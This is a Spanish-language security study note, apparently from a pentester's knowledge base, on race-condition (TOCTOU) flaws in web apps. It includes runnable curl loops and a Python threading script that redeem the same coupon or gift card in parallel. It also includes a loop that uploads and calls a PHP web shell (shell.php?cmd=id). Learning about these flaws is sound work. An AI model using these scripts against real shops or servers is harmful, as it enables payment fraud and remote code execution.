---
title: "Race Conditions"
type: note
status: active
tags:
  - seguridad
  - web
  - race-condition
  - vulnerabilidades
aliases:
  - Race Conditions
  - TOCTOU
  - Time of Check Time of Use
created: 2026-06-13
updated: 2026-06-13
---

# Race Conditions

> [!INFO] Fuente
> PortSwigger Race Conditions, PayloadsAllTheThings.

---

## Que es

Una **race condition** ocurre cuando dos o mas operaciones acceden a un recurso compartido al mismo tiempo, y el resultado depende del orden de ejecucion.

En terminos simples: el sistema hace "check" (tiene saldo?) y luego "use" (resta saldo), pero entre el check y el use hay una ventana donde todo puede pasar.

---

## Donde buscarlas

```yaml
Escenarios comunes:
  - Canje de cupones/gift cards multiples veces
  - Votaciones (multiple voto en paralelo)
  - Transferencias bancarias (gastar el mismo saldo dos veces)
  - Creacion de cuenta con mismo email
  - Limite de rate-limit (enviar N requests antes de que se active)
  - File upload (subir archivo antes de que se valide)
  - Lottery/raffles (comprar mas tickets del permitido)
```

---

## Tecnica de explotacion

### Parallel requests (HTTP/1.1 pipelining)

```bash
# Enviar multiples requests simultaneas
# Si el servidor no bloquea, todas pasan el check antes de que ninguna haga el use

# Con curl
for i in $(seq 1 20); do
  curl -s "https://target.com/api/coupon/redeem?code=FREE50" &
done
wait

# Con Burp (Intruder → Resource pool → Maximum concurrent requests = 20)
# Con turbo intruder (plugin)
```

### Last-byte sync

```bash
# Tecnica mas precisa:
# 1. Enviar todas las requests
# 2. Enviar el ultimo byte de todas al mismo tiempo (con un solo keystroke)
# Esto asegura que lleguen simultaneamente al servidor

# script.py
import requests
import threading

url = "https://target.com/api/redeem"
data = {"code": "FREE50"}
cookies = {"session": "abc123"}

def send():
    requests.post(url, data=data, cookies=cookies)

threads = []
for i in range(20):
    t = threading.Thread(target=send)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

---

## Ejemplo: Gift card redemption

```
Escenario:
  - Gift card de $50
  - Solo se puede canjear una vez (check: ya fue usada?)
  - Pero si envias 10 requests en paralelo...
  - Todas pasan el check antes de que ninguna marque la card como usada
  - → $500 de credito por una gift card de $50
```

```http
POST /api/giftcard/redeem
Content-Type: application/json

{"code": "GIFT-ABC123"}

# Enviar 10 copias de esta request simultaneamente
# Las 10 pueden pasar si hay race condition
```

---

## Ejemplo: Coupon stacking

```
Escenario:
  - Cupon: PRIMERCOMPRA (50% off)
  - Check: el cupon ya fue usado por este usuario?
  - Si envias N requests en paralelo...
  - Todas se aplican al mismo carrito
  - → Precio final = precio * (0.5)^N
  - Con 5 requests en paralelo → 96.875% de descuento
```

---

## Single-endpoint vs multi-endpoint

### Single-endpoint race

```
Dos requests al mismo endpoint compiten por el mismo recurso.
Ej: dos canjes de gift card al mismo tiempo.
```

### Multi-endpoint race (Time-of-Check Time-of-Use)

```
Request A: POST /api/checkout          (checkea saldo)
Request B: POST /api/cart/add          (agrega items)
Request C: POST /api/coupon/redeem     (aplica cupon)

Si logras que C se ejecute entre la verificacion de A y la confirmacion,
podes aplicar un cupon que ya no deberia ser valido.
```

---

## Race condition en file upload

```
1. Subir archivo PHP
2. El servidor lo valida (es imagen?)
3. Si no es imagen, lo borra
4. Pero entre el upload y el borrado... podes ejecutarlo

# Script
while true; do
  curl https://target.com/uploads/shell.php?cmd=id
done

# Y en otro terminal:
while true; do
  curl -F "file=@shell.php" https://target.com/upload
done
```

En algun momento, el shell.php existe el tiempo suficiente para ser ejecutado.

---

## Herramientas

| Herramienta | Uso |
|-------------|-----|
| Burp Turbo Intruder | Envio de requests en paralelo |
| RaceTheWeb | Auto-deteccion de race conditions |
| HTTP pipelining | curl con multiples requests en una conexion |
| Custom Python script | threading + requests |

---

## Labs

| Recurso | Link |
|---------|------|
| PortSwigger Race Conditions | portswigger.net/web-security/race-conditions |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/00 - INDICE]]
